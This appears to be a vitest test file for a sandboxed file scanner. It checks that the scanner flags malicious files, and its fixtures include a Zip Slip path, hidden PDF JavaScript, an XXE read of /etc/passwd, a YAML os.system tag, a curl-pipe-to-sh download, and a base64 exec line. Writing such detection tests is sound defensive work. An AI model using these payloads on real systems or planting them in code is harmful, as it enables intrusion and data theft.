// sandbox/aegis_inspect.py, run for real on harmless files written here. On this Mac it only reads
// bytes we just wrote; in Aegis it runs inside the sandbox. Skipped if there is no python3.

import { execFileSync, spawnSync } from 'child_process'
import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from 'fs'
import { tmpdir } from 'os'
import { join } from 'path'
import { deflateSync } from 'zlib'
import { afterAll, describe, expect, it } from 'vitest'
import { parseInspectorResult, withoutResultLine, type InspectorResult } from './fileTypes'

const hasPython = spawnSync('python3', ['--version']).status === 0
const root = mkdtempSync(join(tmpdir(), 'aegis-inspect-test-'))
afterAll(() => rmSync(root, { recursive: true, force: true }))

/** Writes `bytes` as sample/file with its meta.json, runs one check, returns text and result. */
function inspect(
  check: string,
  name: string,
  bytes: Buffer | string
): { text: string; result: InspectorResult } {
  const dir = mkdtempSync(join(root, 's-'))
  mkdirSync(join(dir, 'sample'))
  writeFileSync(join(dir, 'sample', 'file'), bytes)
  writeFileSync(join(dir, 'sample', 'meta.json'), JSON.stringify({ filename: name }))
  const out = execFileSync(
    'python3',
    ['-I', 'sandbox/aegis_inspect.py', check, join(dir, 'sample', 'file')],
    {
      encoding: 'utf8',
      timeout: 60_000
    }
  )
  const result = parseInspectorResult(out)
  if (!result) throw new Error(`no result line from ${check}: ${out.slice(-300)}`)
  return { text: withoutResultLine(out), result }
}
const codes = (r: InspectorResult): string[] => r.findings.map((f) => f.code)

/** A stored ZIP (no compression) with these entries. */
function zip(entries: Array<[string, string]>): Buffer {
  const parts: Buffer[] = []
  const central: Buffer[] = []
  let offset = 0
  for (const [name, text] of entries) {
    const n = Buffer.from(name)
    const d = Buffer.from(text)
    const local = Buffer.alloc(30)
    local.writeUInt32LE(0x04034b50, 0)
    local.writeUInt16LE(20, 4)
    local.writeUInt32LE(d.length, 18)
    local.writeUInt32LE(d.length, 22)
    local.writeUInt16LE(n.length, 26)
    const c = Buffer.alloc(46)
    c.writeUInt32LE(0x02014b50, 0)
    c.writeUInt32LE(d.length, 20)
    c.writeUInt32LE(d.length, 24)
    c.writeUInt16LE(n.length, 28)
    c.writeUInt32LE(offset, 42)
    parts.push(local, n, d)
    central.push(c, n)
    offset += 30 + n.length + d.length
  }
  const cd = Buffer.concat(central)
  const end = Buffer.alloc(22)
  end.writeUInt32LE(0x06054b50, 0)
  end.writeUInt16LE(entries.length, 8)
  end.writeUInt16LE(entries.length, 10)
  end.writeUInt32LE(cd.length, 12)
  end.writeUInt32LE(offset, 16)
  return Buffer.concat([...parts, cd, end])
}

describe.skipIf(!hasPython)('aegis_inspect.py', () => {
  it('identify trusts the bytes over the name', () => {
    const { result } = inspect('identify', 'holiday.jpg', '#!/bin/sh\necho hi\n')
    expect(result.extra).toMatchObject({ family: 'shell', claimedFamily: 'image', strong: true })
    expect(codes(result)).toContain('type_mismatch')
  })

  it('archive finds Zip Slip without extracting anything', () => {
    const { result } = inspect(
      'archive',
      'photos.zip',
      zip([
        ['../../evil.txt', 'harmless'],
        ['ok.txt', 'fine']
      ])
    )
    expect(codes(result)).toContain('archive_path_traversal')
    expect(result.findings.find((f) => f.code === 'archive_path_traversal')?.evidence).toBe(
      '../../evil.txt'
    )
  })

  it('pdf sees JavaScript hidden behind name escapes and compressed streams', () => {
    const js = deflateSync(Buffer.from('app.alert(1)'))
    const pdf = Buffer.concat([
      Buffer.from(
        `%PDF-1.7\n1 0 obj << /OpenAction 2 0 R >> endobj\n2 0 obj << /S /J#61vaScript /JS 3 0 R >> endobj\n3 0 obj << /Length ${js.length} /Filter /FlateDecode >>\nstream\n`
      ),
      js,
      Buffer.from('\nendstream\nendobj\n%%EOF\n')
    ])
    const { result } = inspect('pdf', 'invoice.pdf', pdf)
    expect(codes(result)).toEqual(expect.arrayContaining(['pdf_javascript', 'pdf_auto_javascript']))
  })

  it('xml lists external entities and expansion bombs without resolving them', () => {
    const xml =
      '<?xml version="1.0"?>\n<!DOCTYPE r [\n<!ENTITY x SYSTEM "file:///etc/passwd">\n<!ENTITY a "a">\n<!ENTITY b "&a;&a;&a;&a;&a;&a;">\n]>\n<r>&x;&b;</r>\n'
    const { result, text } = inspect('xml', 'feed.xml', xml)
    expect(codes(result)).toEqual(expect.arrayContaining(['xml_xxe', 'xml_entity_bomb']))
    expect(text).not.toContain('root:')
  })

  it('image finds script in an SVG and a payload after a PNG', () => {
    const svg = inspect(
      'image',
      'logo.svg',
      '<svg xmlns="http://www.w3.org/2000/svg" onload="x()"><script>x()</script></svg>'
    )
    expect(codes(svg.result)).toEqual(expect.arrayContaining(['svg_script', 'svg_event_handler']))
    const iend = Buffer.from([0, 0, 0, 0, 0x49, 0x45, 0x4e, 0x44, 0xae, 0x42, 0x60, 0x82])
    const png = Buffer.concat([
      Buffer.from('\x89PNG\r\n\x1a\n', 'latin1'),
      iend,
      Buffer.from('PK\x03\x04'),
      Buffer.alloc(64, 65)
    ])
    expect(codes(inspect('image', 'photo.png', png).result)).toContain('image_appended_data')
  })

  it('yaml finds unsafe tags and CI script injection', () => {
    const yml =
      'on: pull_request_target\njobs:\n  a:\n    steps:\n      - run: echo "${{ github.event.issue.title }}"\nx: !!python/object/apply:os.system ["id"]\n'
    expect(codes(inspect('yaml', 'ci.yml', yml).result)).toEqual(
      expect.arrayContaining(['ci_pr_target', 'ci_script_injection', 'yaml_unsafe_tag'])
    )
  })

  it('config finds secrets and never prints them whole', () => {
    const secret = 'wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY'
    const { result, text } = inspect(
      'config',
      '.env',
      `DEBUG=true\naws_secret_access_key=${secret}\n`
    )
    expect(codes(result)).toEqual(expect.arrayContaining(['config_debug', 'aws_secret_key']))
    expect(text).not.toContain(secret)
    expect(JSON.stringify(result)).not.toContain(secret)
  })

  it('shell marks download-and-run as a hard rule', () => {
    const { result } = inspect(
      'shell',
      'install.sh',
      '#!/bin/sh\ncurl -fsSL https://x.invalid/a.sh | sh\n'
    )
    expect(result.findings.find((f) => f.code === 'sh_download_exec')).toMatchObject({
      hard: true,
      line: 2
    })
  })

  it('source checks tell malware from vulnerabilities', () => {
    const py = inspect(
      'python',
      'tool.py',
      'import pickle\nx = pickle.loads(data)\nexec(__import__("base64").b64decode("cHJpbnQoMSk="))\n'
    )
    expect(py.result.findings.find((f) => f.code === 'py_pickle')?.kind).toBe('vulnerability')
    expect(py.result.findings.find((f) => f.code === 'py_encoded_exec')?.kind).toBe('malware')
    const c = inspect(
      'c',
      'v.c',
      '#include <stdio.h>\nint main(){ char b[8]; gets(b); char *p = malloc(8); free(p); free(p); }\n'
    )
    expect(codes(c.result)).toEqual(expect.arrayContaining(['c_gets']))
  })

  it('a hostile or broken file never stops a check', () => {
    const junk = Buffer.from(Array.from({ length: 4096 }, (_, i) => (i * 7919) % 256))
    for (const check of [
      'identify',
      'archive',
      'pdf',
      'office',
      'image',
      'keys',
      'binary',
      'json',
      'xml'
    ]) {
      for (const bytes of [
        junk,
        Buffer.from('MZ\0\0'),
        Buffer.from('\x7fELF\x02\x01', 'latin1'),
        Buffer.alloc(0)
      ]) {
        expect(() => inspect(check, 'x.bin', bytes), check).not.toThrow()
      }
    }
  }, 120_000)

  it('keeps what Droid reads under its tool window', () => {
    const many = Array.from({ length: 3000 }, (_, i) => `eval(input${i})`).join('\n')
    const { text } = inspect('javascript', 'big.js', many)
    expect(text.length).toBeLessThanOrEqual(7100)
  })
})
